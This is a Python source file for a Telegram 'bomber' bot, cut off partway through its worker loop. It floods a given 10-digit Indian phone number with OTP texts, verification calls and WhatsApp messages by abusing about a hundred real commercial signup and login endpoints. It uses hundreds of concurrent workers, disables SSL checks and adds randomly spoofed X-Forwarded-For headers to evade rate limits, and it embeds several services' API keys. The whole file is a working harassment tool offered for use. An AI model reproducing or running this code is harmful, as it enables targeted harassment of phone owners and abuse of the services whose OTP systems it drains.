import os
import time
import asyncio
import logging
import random
import uuid
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN    = os.environ["BOT_TOKEN"]
CHANNEL_ID   = int(os.environ.get("CHANNEL_ID", "-1004264694127"))
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/heisebburgscript")
PORT         = int(os.environ.get("PORT", 8000))

# ---- SPEED TUNING ----
WORKERS         = 400     # persistent workers per session
REQUEST_TIMEOUT = 3       # hard per-request cap (seconds)
CONNECT_TIMEOUT = 1       # TCP connect cap (seconds)
REFILL_CHUNK    = 100     # how many queue items to refill at once
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("bomber")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None


def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"


async def is_member(bot: Bot, user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        logger.warning(f"membership check failed for {user_id}: {e}")
        return False


def force_join_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ Verify Membership", callback_data="verify_join")],
    ]
    return InlineKeyboardMarkup(keyboard)


# =========================================================================
#  LIVE ENDPOINTS — SMS / CALL / WHATSAPP
# =========================================================================
def build_endpoints():
    UA_D = (
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.0.0 Mobile Safari/537.36"
    )
    E = []

    # ---------------- SMS ----------------
    E.append({"name": "Swiggy_Signup", "method": "POST", "url": "https://www.swiggy.com/mapi/auth/signup", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/auth/register"}, "data": '{"name":"test","email":"t@t.com","password":"test1234","mobile":"{t}"}'})
    E.append({"name": "Zomato_Login", "method": "POST", "url": "https://www.zomato.com/webroutes/auth/login", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.zomato.com", "Referer": "https://www.zomato.com/"}, "data": '{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
    E.append({"name": "BigBasket_OTP", "method": "POST", "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.bigbasket.com", "Referer": "https://www.bigbasket.com/auth/login/", "x-channel": "BB-PWA"}, "data": '{"identifier":"{t}"}'})
    E.append({"name": "Ajio_Signup", "method": "POST", "url": "https://login.web.ajio.com/api/auth/signupSendOTP", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.ajio.com", "Referer": "https://www.ajio.com/signup"}, "data": '{"firstName":"test","login":"t@t.com","password":"test@123xx","mobileNumber":"{t}","requestType":"SENDOTP"}'})
    E.append({"name": "Myntra_OTP", "method": "POST", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.myntra.com", "Referer": "https://www.myntra.com/login"}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Nykaa_OTP", "method": "POST", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D}, "data": "source=sms&app_version=3.0.9&mobile_number={t}&platform=ANDROID&domain=nykaa"})
    E.append({"name": "Tatacliq_OTP", "method": "POST", "url": "https://www.tatacliq.com/api/v1/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.tatacliq.com", "Referer": "https://www.tatacliq.com/login"}, "data": '{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name": "PharmEasy_OTP", "method": "POST", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://pharmeasy.in", "Referer": "https://pharmeasy.in/login"}, "data": '{"phone":"{t}"}'})
    E.append({"name": "1mg_CreateToken", "method": "POST", "url": "https://www.1mg.com/auth_api/v6/create_token", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"number":"{t}"}'})
    E.append({"name": "Lenskart_v3", "method": "POST", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN", "User-Agent": UA_D}, "data": '{"captcha":null,"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name": "Dream11_Passwordless", "method": "POST", "url": "https://www.dream11.com/auth/passwordless/init", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.dream11.com", "Referer": "https://www.dream11.com/"}, "data": '{"channel":"sms","flow":"SIGNUP","phoneNumber":"{t}","templateName":"default"}'})
    E.append({"name": "Unacademy_UserCheck", "method": "POST", "url": "https://unacademy.com/api/v3/user/user_check/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://unacademy.com", "Referer": "https://unacademy.com/login"}, "data": '{"phone":"{t}","send_otp":true}'})
    E.append({"name": "Vedantu_PreLogin", "method": "POST", "url": "https://user.vedantu.com/user/preLoginVerification", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.vedantu.com"}, "data": '{"phoneNumber":"{t}","phoneCode":"+91"}'})
    E.append({"name": "Byjus_SendOtp", "method": "POST", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D, "Origin": "https://byjus.com"}, "data": "phoneNumber={t}"})
    E.append({"name": "Aakash_LeadOTP", "method": "POST", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile_number":"{t}","activity_type":"aakash-myadmission"}'})
    E.append({"name": "Cuemath_Parent", "method": "POST", "url": "https://www.cuemath.com/api/v4/parents/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","email":"","full_name":"","place_id":""}'})
    E.append({"name": "Doubtnut_v4", "method": "POST", "url": "https://api.doubtnut.com/v4/student/login", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone_number":"{t}","language":"en"}'})
    E.append({"name": "Khatabook_Request", "method": "POST", "url": "https://api.khatabook.com/v1/auth/request-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name": "ShipRocket_v1", "method": "POST", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobileNumber":"{t}"}'})
    E.append({"name": "Wakefit_SMS", "method": "POST", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb", "User-Agent": UA_D}, "data": '{"mobile":"{t}","whatsapp_opt_in":1}'})
    E.append({"name": "Housing_SendOtp", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name": "NoBroker_v3", "method": "POST", "url": "https://www.nobroker.in/api/v3/account/otp/send", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D}, "data": "phone={t}&countryCode=IN"})
    E.append({"name": "Groww_OTP", "method": "POST", "url": "https://groww.in/api/v2/auth/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","platform":"WEB"}'})
    E.append({"name": "Redbus_Auth", "method": "POST", "url": "https://www.redbus.in/api/v2/auth/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","source":"web"}'})
    E.append({"name": "Dominos_Forgot", "method": "POST", "url": "https://api.dominos.co.in/loginhandler/forgotpassword", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://m.dominos.co.in"}, "data": '{"lastName":"","mobile":"{t}","firstName":""}'})
    E.append({"name": "KFC_ResendOTP", "method": "POST", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://online.kfc.co.in", "Referer": "https://online.kfc.co.in/login"}, "data": '{"phoneNumber":"{t}","AuthorizedFor":"3","Resend":"false"}'})
    E.append({"name": "PizzaHut_Gen", "method": "POST", "url": "https://api.pizzahut.io/v1/otp/generate", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.pizzahut.co.in"}, "data": '{"phone":"+91{t}"}'})
    E.append({"name": "BurgerKing_SignUp", "method": "POST", "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.burgerking.in", "Referer": "https://www.burgerking.in/", "platform": "web"}, "data": '{"phone_no":"{t}"}'})
    E.append({"name": "Licious_Signup", "method": "POST", "url": "https://www.licious.in/api/login/signup", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","captcha_token":null}'})
    E.append({"name": "Zepto_Signup", "method": "POST", "url": "https://api.zepto.co.in/api/v1/user/customer/signup/", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"}, "data": '{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})
    E.append({"name": "Blinkit_OTP", "method": "POST", "url": "https://api.grofers.com/v5/otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "JioMart_SendOtp", "method": "POST", "url": "https://www.jiomart.com/api/v1/user/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Meesho_SendOTP", "method": "POST", "url": "https://www.meesho.com/api/v1/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "Snapdeal_Auth", "method": "POST", "url": "https://www.snapdeal.com/authenticate/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Flipkart_LoginV4", "method": "POST", "url": "https://1.rome.api.flipkart.com/1/action/view", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "x-user-agent": UA_D, "Origin": "https://www.flipkart.com", "Referer": "https://www.flipkart.com/login"}, "data": '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'})
    E.append({"name": "Ola_Login", "method": "POST", "url": "https://accounts.olacabs.com/api/login", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://accounts.olacabs.com"}, "data": '{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN"}'})
    E.append({"name": "Rapido_OTP", "method": "POST", "url": "https://customer.rapido.bike/api/otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Spinny_OTP", "method": "POST", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"contact_number":"{t}","whatsapp":false,"code_len":4,"expected_action":"login"}'})
    E.append({"name": "OYO_GenOTP", "method": "POST", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "headers": {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": UA_D, "Origin": "https://www.oyorooms.com"}, "data": '{"phone":"{t}","country_code":"+91","nod":4}'})
    E.append({"name": "MakeMyTrip_User", "method": "POST", "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.makemytrip.com"}, "data": '{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})
    E.append({"name": "EaseMyTrip_Register", "method": "POST", "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"emailph":"+91{t}"}'})
    E.append({"name": "Redbus_GetOtp", "method": "GET", "url": "https://m.redbus.in/api/getOtp?number={t}&cc=91", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "ConfirmTkt_Register", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&channel=Android", "headers": {"User-Agent": "okhttp/5.0.0-alpha.3"}, "data": None})
    E.append({"name": "WorkIndia_Login", "method": "GET", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={t}&version_number=623", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "Jockey_SMS", "method": "GET", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{t}?whatsapp=false", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "Vyapar_SendOtp", "method": "GET", "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={t}", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "Zee5_OTP", "method": "GET", "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={t}", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "CodFirm_SMS", "method": "GET", "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{t}&storeUrl=bellavita1.myshopify.com", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "OTPLess_Intent", "method": "POST", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","selectedCountryCode":"+91"}'})
    E.append({"name": "GoKwik_OTP", "method": "POST", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad", "User-Agent": UA_D}, "data": '{"phone":"{t}","country":"in"}'})
    E.append({"name": "Smytten_AddOTP", "method": "POST", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "headers": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f", "User-Agent": UA_D}, "data": '{"phone":"{t}","email":"test@test.com"}'})
    E.append({"name": "Entri_CheckPhone", "method": "POST", "url": "https://entri.app/api/v3/users/check-phone/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "ShoppersStop_OTP", "method": "POST", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","type":"SIGNIN_WITH_MOBILE"}'})
    E.append({"name": "Lifestyle_SendOTP", "method": "POST", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"signInMobile":"{t}","channel":"sms"}'})
    E.append({"name": "Moglix_SendOTP", "method": "POST", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","buildVersion":"24.0"}'})
    E.append({"name": "TrulyMadly_OTP", "method": "POST", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","locale":"IN"}'})
    E.append({"name": "MyHubble_OTP", "method": "POST", "url": "https://api.myhubble.money/v1/auth/otp/generate", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phoneNumber":"{t}","channel":"SMS"}'})
    E.append({"name": "DealShare_SendLogin", "method": "POST", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","hashCode":"k387IsBaTmn"}'})
    E.append({"name": "Snapmint_SignUp", "method": "POST", "url": "https://api.snapmint.com/v1/public/sign_up", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "RentoMojo_Check", "method": "POST", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "Revv_Init", "method": "POST", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","deviceType":"website"}'})
    E.append({"name": "TataCapital_BizLoan", "method": "POST", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobileNumber":"{t}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}'})
    E.append({"name": "BajajFinserv_SSO", "method": "POST", "url": "https://apigateway.bajajfinserv.in/apigateway/otp/sso", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name": "Udaan_OTP", "method": "POST", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D}, "data": "mobile={t}"})
    E.append({"name": "TVS_Login", "method": "POST", "url": "https://tvsconnectapi.tvsmotor.com/api/v3/UserLogin/Loginv3", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/5.0.0-alpha.2"}, "data": '{"IsSuppressOTP":false,"MobileNumber":"{t}","otpLength":6}'})
    E.append({"name": "TataMotors_SignUp", "method": "POST", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","sendOtp":"true"}'})
    E.append({"name": "KreditBee_OTP", "method": "POST", "url": "https://api.kreditbee.in/api/v2/auth/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "Citymall_OTP", "method": "POST", "url": "https://citymall.live/api/cl-user/auth/get-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone_number":"{t}"}'})
    E.append({"name": "Jobhai_SendOTP", "method": "POST", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}"}'})
    E.append({"name": "Brevistay_Login", "method": "POST", "url": "https://www.brevistay.com/cst/app-api/login", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Pagarbook_OTP", "method": "POST", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","language":1}'})
    E.append({"name": "Redcliffe_OTP", "method": "POST", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone_number":"{t}"}'})
    E.append({"name": "Woodenstreet_Register", "method": "POST", "url": "https://api.woodenstreet.com/api/v1/register", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"telephone":"{t}"}'})
    E.append({"name": "HealthMug_OTP", "method": "POST", "url": "https://api.healthmug.com/account/createotp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Kredily_OTP", "method": "POST", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "MoreRetail_Login", "method": "POST", "url": "https://omni-api.moreretail.in/api/v1/login/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","hash_key":"XfsoCeXADQA"}'})
    E.append({"name": "Charzer_SendOTP", "method": "POST", "url": "https://api.charzer.com/auth-service/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","appSource":"CHARZER_APP"}'})
    E.append({"name": "BikeFixup_OTP", "method": "POST", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "headers": {"Content-Type": "application/json", "client": "app", "User-Agent": UA_D}, "data": '{"phone":"{t}","app_signature":"4pFtQJwcz6y"}'})
    E.append({"name": "Spencers_SendOTP", "method": "POST", "url": "https://jiffy.spencers.in/user/auth/otp/send", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "PayMeIndia_Verify", "method": "POST", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","app_signature":"S10ePIIrbH3"}'})
    E.append({"name": "HomeTriangle_Signup", "method": "POST", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Swipe_MobileLogin", "method": "POST", "url": "https://app.getswipe.in/api/user/mobile_login", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","resend":true}'})
    E.append({"name": "Mpokket_SendOTP", "method": "POST", "url": "https://web-api.mpokket.in/registration/sendOtp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Nuvama_Register", "method": "POST", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobileNo":"{t}","emailID":"test@test.com"}'})
    E.append({"name": "BetterHalf_OTP", "method": "POST", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}","isd_code":"91"}'})
    E.append({"name": "55Club_SmsVerify", "method": "POST", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"91{t}","codeType":1}'})
    E.append({"name": "MyImagineStore_OTP", "method": "POST", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D}, "data": "mobile={t}"})
    E.append({"name": "Cossouq_OTP", "method": "POST", "url": "https://www.cossouq.com/mobilelogin/otp/send", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA_D}, "data": "mobilenumber={t}&otptype=register"})
    E.append({"name": "Shemaroome_Resend", "method": "POST", "url": "https://www.shemaroome.com/users/resend_otp", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "User-Agent": UA_D}, "data": "mobile_no=%2B91{t}"})

    # ---------------- CALL ----------------
    E.append({"name": "Swiggy_VoiceCall", "method": "POST", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "headers": {"Content-Type": "application/json", "User-Agent": UA_D, "Origin": "https://www.swiggy.com"}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "TataCapital_Voice", "method": "POST", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name": "1mg_VoiceCall", "method": "POST", "url": "https://www.1mg.com/auth_api/v6/create_token", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"number":"{t}","otp_on_call":true}'})
    E.append({"name": "MagicPin_Voice", "method": "POST", "url": "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "headers": {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT", "Origin": "https://magicpin.in", "User-Agent": UA_D}, "data": '{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
    E.append({"name": "JioSaavn_Call", "method": "POST", "url": "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone_number":"+91{t}"}'})
    E.append({"name": "Careers360_Call", "method": "POST", "url": "https://www.careers360.com/ajax/no-cache/user/otp-send", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "User-Agent": UA_D, "Origin": "https://www.careers360.com"}, "data": "mobile_number={t}&method=call"})

    # ---------------- WHATSAPP ----------------
    E.append({"name": "KPN_WhatsApp", "method": "POST", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "headers": {"Content-Type": "application/json", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": UA_D}, "data": '{"phone_number":{"number":"{t}","country_code":"+91"},"notification_channel":"WHATSAPP"}'})
    E.append({"name": "Foxy_WhatsApp", "method": "POST", "url": "https://www.foxy.in/api/v2/users/send_otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"user":{"phone_number":"+91{t}"},"via":"whatsapp"}'})
    E.append({"name": "Stratzy_WA", "method": "POST", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phoneNo":"{t}"}'})
    E.append({"name": "Jockey_WA", "method": "GET", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{t}?whatsapp=true", "headers": {"User-Agent": UA_D}, "data": None})
    E.append({"name": "EkaCare_WA", "method": "POST", "url": "https://auth.eka.care/auth/init", "headers": {"Content-Type": "application/json", "Client-Id": "androidp", "User-Agent": UA_D}, "data": '{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
    E.append({"name": "Refyne_WA", "method": "POST", "url": "https://prod-api.refyne.co.in/auth/v3/send-otp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"channel":"WHATSAPP","recipient":"{t}"}'})
    E.append({"name": "VisitApp_WA", "method": "POST", "url": "https://api.getvisitapp.com/v3/new-auth/login-phone", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
    E.append({"name": "HeroFinCorp_WA", "method": "POST", "url": "https://loans.apps.herofincorp.com/api/generateOtp", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name": "MamaEarth_Initiate", "method": "POST", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"mobile":"{t}"}'})
    E.append({"name": "Rappi_WA", "method": "POST", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "headers": {"Content-Type": "application/json", "User-Agent": UA_D}, "data": '{"country_code":"+91","phone":"{t}"}'})

    # ---------------- DEDUPE ----------------
    seen = set()
    out = []
    for ep in E:
        key = (ep["method"], ep["url"])
        if key in seen:
            continue
        seen.add(key)
        out.append(ep)
    return out


ENDPOINTS = build_endpoints()
logger.info(f"✅ Loaded {len(ENDPOINTS)} live endpoints")


# ================== HTTP ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=600,
            limit_per_host=120,
            ttl_dns_cache=300,
            ssl=False,
            force_close=False,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(
            total=REQUEST_TIMEOUT,
            connect=CONNECT_TIMEOUT,
        )
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session


async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    u_id = uuid.uuid4().hex
    url = url.replace("{uuid}", u_id).replace("{timestamp}", str(int(time.time() * 1000)))

    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)

    async def _do():
        session = await get_http_session()
        async with session.request(
            method=ep["method"], url=url, headers=headers,
            data=data if data else None, ssl=False,
        ) as resp:
            body = await resp.text()
            ok = resp.status in (200, 201, 202)
            if ok:
                logger.info(f"[{ep['name']}] {resp.status} | {body[:80]}")
            return ok

    try:
        return await asyncio.wait_for(_do(), timeout=REQUEST_TIMEOUT)
    except Exception:
        return False


# ================== CONTINUOUS WORKER POOL ==================
async def _worker(target: str, queue: asyncio.Queue, session: dict, counter: dict):
    while session.get("running"):
        try:
            ep = await asyncio.wait_for(queue.get(), timeout=1.0)
        except asyncio.TimeoutError:
            continue
        try:
